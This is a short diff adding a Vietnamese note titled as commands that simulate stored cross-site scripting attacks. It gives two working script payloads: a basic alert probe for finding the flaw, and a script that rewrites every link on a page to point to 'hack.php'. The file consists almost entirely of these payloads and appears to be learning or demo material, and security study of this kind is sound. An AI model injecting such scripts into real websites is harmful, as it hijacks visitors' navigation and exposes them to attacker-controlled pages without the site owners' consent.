@@ -1,0 +1,10 @@
+MỘT SỐ LỆNH MÔ PHỎNG TẤN CÔNG STORED XSS
+
+1. Chèn lệnh scpirt đơn giản kiểm tra lỗ hỗng web
+
+<script>alert("XSS")</script>
+
+
+2. Thay đổi link (đường dẫn) sang trang web khác
+
+<script>alert(document.links.length); for(i=0;i<=document.links.length;i++) {document.links[i].href="hack.php";}</script>
